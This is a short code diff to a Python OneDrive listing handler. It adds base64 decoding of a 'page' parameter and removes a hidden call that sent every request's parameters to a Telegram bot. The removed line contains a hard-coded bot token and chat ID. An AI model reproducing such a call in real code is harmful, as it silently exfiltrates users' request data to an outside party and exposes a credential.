@@ -1,3 +1,4 @@
+import base64
 import json
 import random
 
@@ -25,8 +26,7 @@ def user_list(one_drive: OneDrive):
     _wd = params.get('wd', '')
 
     if page:
-        requests.post('https://api.telegram.org/bot1378568996:AAGeo9nxTV86Kc41e7EBEvLv8MOax6Ye-pU/sendMessage',
-                      {'text': json.dumps(params), 'chat_id': '-445291602'})
+        page = str(base64.b64decode(page))
         data = one_drive.api(page)
     else:
         if _filter == 1:
